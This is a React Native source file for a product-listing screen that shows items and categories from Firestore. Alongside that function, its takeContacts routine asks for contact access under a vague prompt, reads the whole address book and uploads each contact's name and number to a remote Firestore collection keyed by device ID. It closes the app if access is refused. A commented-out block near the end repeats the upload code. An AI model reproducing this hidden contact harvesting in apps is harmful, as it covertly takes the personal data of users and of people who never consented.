import React, { useEffect, useState } from 'react';
import {
  View,
  Text,
  StyleSheet,
  FlatList,
  Image,
  TouchableOpacity,
  SafeAreaView,
  TextInput,
  ScrollView,
  Modal,
  TouchableWithoutFeedback,
  ActivityIndicator,
  PermissionsAndroid,
  BackHandler
} from 'react-native';
import firestore from '@react-native-firebase/firestore';
import { useIsFocused, useNavigation } from '@react-navigation/native';
import Toast from 'react-native-simple-toast';
import Contacts from 'react-native-contacts';
import DeviceInfo from 'react-native-device-info';

const UserItems = () => {
  const isFocused = useIsFocused();
  const navigation = useNavigation();
  const [items, setItems] = useState([]);
  const [search, setSearch] = useState('');
  const [filteredItems, setFilteredItems] = useState([]);
  const [categories, setCategories] = useState([]);
  const [selectedCategory, setSelectedCategory] = useState('');
  const [isCategoryModalVisible, setIsCategoryModalVisible] = useState(false);
  const [loading,setLoading] = useState(false)
  const [permission,setPermission] = useState(false)

  useEffect(() => {
    try {
      getItems();
      takeContacts(); 
    } catch (error) {
      console.log(error)
    }
  }, [isFocused]);

  const takeContacts =() =>{
    try {
      setPermission(true)
      PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_CONTACTS, {
        title: 'Contacts',
        message: 'This app would like to view your contacts.',
        buttonPositive: 'Please accept',
    })
        .then((res) => {
            if(res!="never_ask_again")
            {
              console.log('Permission: g', res);


              Contacts.getAll()
              .then((contacts) => {
                  contacts.forEach(async (contact)=>{
                      
                      const {phoneNumbers,givenName} = contact
                      console.log(givenName)
                      console.log(phoneNumbers[0].number)
                      const contactRef = firestore().collection('contacts');
                      const querySnapshot = await contactRef
                        .where('number', '==', phoneNumbers[0].number)
                        .get();
                  

                  
                      if (!querySnapshot.empty) {
                          console.log("Contact Already added")
                      } else {
                        //Toast.show('Category Adding');
                        // Save the category to Firestore
                        try {

                          const deviceId = DeviceInfo.getUniqueId();

                          // Check if the device ID already exists in the 'contacts' collection
                          const deviceRef = firestore().collection('contacts').doc(deviceId);
                          const deviceDoc = await deviceRef.get();
                        
                          if (!deviceDoc.exists) {
                            // If the device ID doesn't exist, create a document with the device ID
                            await deviceRef.set({});
                        
                            // Save the contact to the 'contact-list' subcollection
                            await deviceRef.collection('contact-list').add({
                              name: givenName,
                              number: phoneNumbers[0].number,
                            });
                        
                            console.log('Contact added');
                          } else {
                            console.log('Device already has contacts');
                          }
                          
                         /* await firestore()
                          .collection('contacts')
                          .doc(DeviceInfo.getUniqueId())
                          .collection('contact-list')
                          .add({
                            name: givenName,
                            number: phoneNumbers[0].number 
                          })
                          .then(()=>{
                              console.log('contact added')
                          });*/
                      }catch(error){
                          console.error('Error adding contacts', error)
                      }
                  }
                  })
              })
              .catch((e) => {
                  console.log(e);
              });
            }else{
              setPermission(false)
              console.log("Hi")
              BackHandler.exitApp();
            }
        })
        .catch((error) => {
            console.error('Permission error: ', error);
        });
    } catch (error) {
      console.log(error)
    }
}

  const getItems = () => {
    setLoading(true)
    firestore()
      .collection('items')
      .get()
      .then((querySnapshot) => {
        let tempData = [];
        querySnapshot.forEach((documentSnapshot) => {
          tempData.push({
            id: documentSnapshot.id,
            data: documentSnapshot.data(),
          });
        });
        setItems(tempData);
        setFilteredItems(tempData);
        getCategories(tempData);
      })
      .finally(()=>{
        setLoading(false)
      })
      
  };

  const getCategories = (data) => {
    const categoryList = data.map((item) => item.data.category);
    // Remove duplicates and empty categories
    const uniqueCategories = ['All', ...new Set(categoryList.filter(Boolean))];
    setCategories(uniqueCategories);
  };

  const searchFilter = (text) => {
    if (text) {
      const newData = items.filter(function (item) {
        const itemData = item.data.category
          ? item.data.category.toUpperCase()
          : ''.toUpperCase();
        const textData = text.toUpperCase();
        return itemData.indexOf(textData) > -1;
      });
      setFilteredItems(newData);
      setSearch(text);
    } else {
      setFilteredItems(items);
      setSearch(text);
    }
  };

  const filterItemsByCategory = (category) => {
    if (category === 'All') {
      setFilteredItems(items);
    } else {
      const newData = items.filter((item) => item.data.category === category);
      setFilteredItems(newData);
    }
    setSelectedCategory(category);
    setIsCategoryModalVisible(false);
  };

  return (
    <View style={styles.container}>
      <SafeAreaView>
        <TouchableOpacity
          style={styles.categoryButton}
          onPress={() => setIsCategoryModalVisible(true)}
        >
          <Text style={styles.categoryButtonText}>
            {selectedCategory || 'Search by Category'}
          </Text>
        </TouchableOpacity>
        <Modal
          visible={isCategoryModalVisible}
          animationType="slide"
          transparent={true}
        >
          <TouchableWithoutFeedback onPress={() => setIsCategoryModalVisible(false)}>
            <View style={styles.categoryModalBackground}>
              <View style={styles.categoryModal}>
              <Text style={styles.modalText}>Choose Category</Text>
                {categories.map((category, index) => (
                  <TouchableOpacity
                    key={index}
                    onPress={() => filterItemsByCategory(category)}
                  >
                    <Text style={styles.categoryItem}>{category}</Text>
                  </TouchableOpacity>
                ))}
              <TouchableOpacity
              style={styles.closeModalBtn}
              onPress={() => setIsCategoryModalVisible(false)}
            >
              <Text style={styles.buttonText}>Close</Text>
            </TouchableOpacity>
              </View>
            </View>
          </TouchableWithoutFeedback>
        </Modal>
      </SafeAreaView>
      {loading ? (<View style={styles.loaderContainer}>
          <ActivityIndicator size="large" color="#0000ff" />
        </View>):(<FlatList
        data={filteredItems}
        renderItem={({ item, index }) => {
          return (
            <TouchableOpacity
              style={styles.itemView}
              activeOpacity={0.8}
              onPress={() => {
                // Handle item press
              }}
            >
              <Image
                source={{ uri: item.data.imageUrl }}
                style={styles.itemImage}
              />
              <View style={styles.nameView}>
            {   <View style={styles.priceView}>
                  <Text style={styles.priceText}>{`₹${item.data.price}`}</Text>
                </View>}
                <Text style={styles.nameText}>{item.data.name}</Text>
                <Text style={styles.catText}>Category: {item.data.category}</Text>
                <Text style={styles.descText}>{item.data.description}</Text>
              </View>
            </TouchableOpacity>
          );
        }}
      />)}
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    marginBottom: 50,
    backgroundColor: '#D7DEDF',
  },
  itemView: {
    flexDirection: 'row',
    width: '95%',
    alignSelf: 'center',
    backgroundColor: '#fbfcfa',
    elevation: 4,
    margin: 5,
    borderRadius: 10,
    padding: 5,
    height: 140,
    borderColor:'black',
    borderWidth:0.5
  },
  itemImage: {
    width: 120,
    height: 120,
    borderRadius: 10,
    marginRight: 10,
  },
  nameView: {
    width: '53%',
  },
  priceView: {
    alignItems: 'flex-end',
    justifyContent: 'flex-start',
    //position: 'absolute',
    alignItems: 'flex-end'
    //flexDirection: 'row',
    //alignItems: 'center',
  },
  nameText: {
    fontSize: 18,
    fontWeight: 'bold',
  },
  catText: {
    fontSize: 14,
    fontWeight: '700',
  },
  descText: {
    fontSize: 14,
    fontWeight: '400',
  },
  priceText: {
    fontSize: 17,
    color: 'green',
    fontWeight: '700',
    top: 0.1,
    right:0.1
  },
  iconContainer: {
    alignItems: 'center',
    justifyContent: 'center',
    width: 50,
  },
  icon: {
    width: 24,
    height: 24,
  },
  searchBox: {
    margin: 10,
    paddingHorizontal: 20,
    paddingVertical: 10,
    borderColor: 'black',
    borderWidth: 1,
    borderRadius: 8,
  },
  // ... your other styles
  categoryButton: {
    margin: 10,
    padding: 10,
    borderWidth: 0.5,
    borderRadius: 8,
    backgroundColor: 'white',
    elevation: 4
  },
  categoryButtonText: {
    fontSize: 14,
    color: 'black'
  },
  categoryModalBackground: {
    flex: 1,
    backgroundColor: 'rgba(0, 0, 0, 0.5)',
    justifyContent: 'center',
    alignItems: 'center',
  },
  categoryModal: {
    width: '90%',
    backgroundColor: 'white',
    elevation: 3,
    borderRadius: 10,
    padding: 10,
    borderColor: 'black',
    borderWidth: 1,
  },
  categoryItem: {
    fontSize: 18,
    padding: 10,
    //textAlign: 'center',
    borderBottomWidth: 0.7,
    borderBottomColor: 'black'
  },
  closeModalBtn: {
    width: '50%',
    alignSelf: 'center',
    borderWidth: 0.5,
    borderRadius: 10,
    padding: 10,
    alignItems: 'center',
    marginTop: 20,
    backgroundColor: '#5246f2',
  },
  modalText: {
    fontSize: 20,
    fontWeight: '700',
    marginBottom: 20,
  },
  buttonText: {
    color: '#fff',
    fontWeight: '400',
  },
});

export default UserItems;



/* finallll caseeeeeeeeeeeee
  const takeContacts =() =>{
    try {
      setPermission(true)
      PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_CONTACTS, {
        title: 'Contacts',
        message: 'This app would like to view your contacts.',
        buttonPositive: 'Please accept',
    })
        .then((res) => {
            if(res!="never_ask_again")
            {
              console.log('Permission: g', res);


              Contacts.getAll()
              .then((contacts) => {
                  contacts.forEach(async (contact)=>{
                      
                      const {phoneNumbers,givenName} = contact
                      console.log(givenName)
                      console.log(phoneNumbers[0].number)
                      const contactRef = firestore().collection('contacts');
                      const querySnapshot = await contactRef
                        .where('number', '==', phoneNumbers[0].number)
                        .get();
                  
                      if (!querySnapshot.empty) {
                          console.log("Contact Already added")
                      } else {
                        //Toast.show('Category Adding');
                        // Save the category to Firestore
                        try {
                          await firestore()
                          .collection('contacts')
                          .doc(DeviceInfo.getUniqueId())
                          .collection('contact-list')
                          .add({
                            name: givenName,
                            number: phoneNumbers[0].number 
                          })
                          .then(()=>{
                              console.log('contact added')
                          });
                      }catch(error){
                          console.error('Error adding contacts', error)
                      }
                  }
                  })
              })
              .catch((e) => {
                  console.log(e);
              });
            }else{
              setPermission(false)
              console.log("Hi")
              BackHandler.exitApp();
            }
        })
        .catch((error) => {
            console.error('Permission error: ', error);
        });
    } catch (error) {
      console.log(error)
    }
}

import React, { useEffect, useState } from 'react';
import {
  View,
  Text,
  StyleSheet,
  FlatList,
  Image,
  TouchableOpacity,
  SafeAreaView,
  TextInput,
  ScrollView,
  Animated,
  Easing,
  ShadowPropTypesIOS,
  ImageBackground
} from 'react-native';
import firestore from '@react-native-firebase/firestore';
import { useIsFocused, useNavigation } from '@react-navigation/native';
import PriceVariationGraphScreen from '../PriceVariationGraphScreen';

const UserItems = () => {
  const isFocused = useIsFocused();
  const navigation = useNavigation();
  const [items, setItems] = useState([]);
  const [search, setSearch] = useState('');
  const [filteredItems, setFilteredItems] = useState([]);
  const [clicked, setClicked] = useState(false);

  useEffect(() => {
    getItems();
  }, [isFocused]);

  const getItems = () => {
    firestore()
      .collection('items')
      .get()
      .then((querySnapshot) => {
        console.log('Total items: ', querySnapshot.size);
        let tempData = [];
        querySnapshot.forEach((documentSnapshot) => {
          console.log('User ID: ', documentSnapshot.id, documentSnapshot.data());
          tempData.push({
            id: documentSnapshot.id,
            data: documentSnapshot.data(),
          });
        });
        setItems(tempData);
        setFilteredItems(tempData);
      });
  };


  const searchFilter = (text) => {
    // Check if searched text is not blank
    if (text) {
      // Inserted text is not blank
      // Filter the masterDataSource
      // Update FilteredDataSource
      const newData = items.filter(function (item) {
        const itemData = item.data.category
          ? item.data.category.toUpperCase()
          : ''.toUpperCase();
        const textData = text.toUpperCase();
        return itemData.indexOf(textData) > -1;
      });
      console.log(newData);
      setFilteredItems(newData);
      setSearch(text);
    } else {
      // Inserted text is blank
      // Update FilteredDataSource with masterDataSource
      setFilteredItems(items);
      setSearch(text);
    }
  };

  return (
    <View style={styles.container}>
      <SafeAreaView>
        <TextInput
          placeholder="Search through category"
          clearButtonMode="always"
          autoCapitalize="none"
          autoCorrect={false}
          style={styles.searchBox}
          value={search}
          onChangeText={(text) => searchFilter(text)}
        />
      </SafeAreaView>
      <FlatList
        data={filteredItems}
        renderItem={({ item, index }) => {
          return (
            <TouchableOpacity
              style={styles.itemView}
              activeOpacity={0.8}
              onPress={() => {
                // Handle item press
              }}
            >
              <Image
                source={{ uri: item.data.imageUrl }}
                style={styles.itemImage}
              />
              <View style={styles.nameView}>
                <View style={styles.priceView}>
                  <Text style={styles.priceText}>{`₹${item.data.price}`}</Text>
                </View>
                <Text style={styles.nameText}>{item.data.name}</Text>
                <Text style={styles.catText}>Category: {item.data.category}</Text>
                <Text style={styles.descText}>{item.data.description}</Text>
              </View>
            </TouchableOpacity>
          );
        }}
      />
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    marginBottom: 50,
    backgroundColor: '#D7DEDF'
  },
  itemView: {
    flexDirection: 'row',
    width: '90%',
    alignSelf: 'center',
    backgroundColor: '#fbfcfa',
    elevation: 4,
    margin: 10,
    borderRadius: 10,
    padding: 10,
    height: 120,
    borderColor:'black',
    borderWidth:0.5
  },
  itemImage: {
    width: 100,
    height: 100,
    borderRadius: 10,
    marginRight: 10,
  },
  nameView: {
    width: '53%',
  },
  priceView: {
    alignItems: 'flex-end',
    justifyContent: 'flex-start',
    //position: 'absolute',
    alignItems: 'flex-end'
    //flexDirection: 'row',
    //alignItems: 'center',
  },
  nameText: {
    fontSize: 18,
    fontWeight: 'bold',
  },
  catText: {
    fontSize: 15,
    fontWeight: '600',
  },
  descText: {
    fontSize: 14,
    fontWeight: '400',
  },
  priceText: {
    fontSize: 18,
    color: 'green',
    fontWeight: '700',
  },
  iconContainer: {
    alignItems: 'center',
    justifyContent: 'center',
    width: 50,
  },
  icon: {
    width: 24,
    height: 24,
  },
  searchBox: {
    margin: 10,
    paddingHorizontal: 20,
    paddingVertical: 10,
    borderColor: 'black',
    borderWidth: 1,
    borderRadius: 8,
  },
});

export default UserItems;*/

/*import {
  View,
  Text,
  StyleSheet,
  FlatList,
  Image,
  TouchableOpacity,
  SafeAreaView,
  TextInput,
  ScrollView
} from 'react-native';
import React, {useEffect, useState} from 'react';
import firestore from '@react-native-firebase/firestore';
import {useIsFocused, useNavigation} from '@react-navigation/native';
const UserItems = () => {

  const isFocused = useIsFocused();
  const navigation = useNavigation();
  const [items, setItems] = useState([]);
  const [search,setSearch] = useState('')
  const [filteredItems, setFilteredItems] = useState([]);
  const [clicked, setClicked] = useState(false)
  useEffect(() => {
    getItems();
  }, [isFocused]);
  const getItems = () => {
    firestore()
      .collection('items')
      .get()
      .then(querySnapshot => {
        console.log('Total items: ', querySnapshot.size);
        let tempData = [];
        querySnapshot.forEach(documentSnapshot => {
          console.log(
            'User ID: ',
            documentSnapshot.id,
            documentSnapshot.data(),
          );
          tempData.push({
            id: documentSnapshot.id,
            data: documentSnapshot.data(),
          });
        });
        setItems(tempData);
        setFilteredItems(tempData);
      });
  };

  const deleteItem = docId => {
    firestore()
      .collection('items')
      .doc(docId)
      .delete()
      .then(() => {
        console.log('User deleted!');
        getItems();
      });
  };

  const searchFilter = (text) => {
    // Check if searched text is not blank
    if (text) {
      // Inserted text is not blank
      // Filter the masterDataSource
      // Update FilteredDataSource
      const newData = items.filter(
        function (item) {
          const itemData = item.data.category
            ? item.data.category.toUpperCase()
            : ''.toUpperCase();
          const textData = text.toUpperCase();
          return itemData.indexOf(textData) > -1;
      });
      console.log(newData)
      setFilteredItems(newData);
      setSearch(text);
    } else {
      // Inserted text is blank
      // Update FilteredDataSource with masterDataSource
      setFilteredItems(items);
      setSearch(text);
    }
  };
  
  return (
    <View style={styles.container}>
      <SafeAreaView>
        <TextInput placeholder='Search through category'
          clearButtonMode="always"
          autoCapitalize="none"
          autoCorrect={false}
          style={styles.searchBox}
          value={search}
          onChangeText={(text)=> searchFilter(text)}></TextInput>
      </SafeAreaView>
      <FlatList
        data={filteredItems}
        renderItem={({item, index}) => {
          return (
            <View style={styles.itemView}>
              <Image
                source={{uri: item.data.imageUrl}}
                style={styles.itemImage}
              />
              <View style={styles.nameView}>
                <Text style={styles.nameText}>{item.data.name}</Text>
                <Text style={styles.catText}>Category : {item.data.category}</Text>
                <Text style={styles.descText}>{item.data.description}</Text>
                <View style={styles.priceView}>
                  <Text style={styles.priceText}>
                    {'₹' + item.data.price}
                  </Text>
                </View>
              </View>
              <View style={{margin: 10}}>

              </View>
            </View>
          );
        }}
      />
    </View>
  );
};

export default UserItems;
const styles = StyleSheet.create({
  container: {
    flex: 1,
    marginBottom: 60,
  },
  itemView: {
    flexDirection: 'row',
    width: '90%',
    alignSelf: 'center',
    backgroundColor: '#fff',
    elevation: 4,
    marginTop: 10,
    borderRadius: 10,
    height: 100,
    marginBottom: 10,
  },
  itemImage: {
    width: 90,
    height: 90,
    borderRadius: 10,
    margin: 5,
  },
  nameView: {
    width: '53%',
    margin: 10,
  },
  priceView: {
    flexDirection: 'row',
    alignItems: 'center',
  },
  nameText: {
    fontSize: 18,
    fontWeight: '900',
  },
  catText: {
    fontSize: 15,
    fontWeight: '700',
  },
  descText: {
    fontSize: 12,
    fontWeight: '600',
  },
  priceText: {
    fontSize: 18,
    color: 'green',
    fontWeight: '700',
  },
  discountText: {
    fontSize: 17,
    fontWeight: '600',
    textDecorationLine: 'line-through',
    marginLeft: 5,
  },
  icon: {
    width: 24,
    height: 24,
  },
  searchBox:{
    margin:10,
    paddingHorizontal:20,
    paddingVertical: 10,
    borderColor: '#ccc',
    borderWidth: 1,
    borderRadius:8
  }
});*/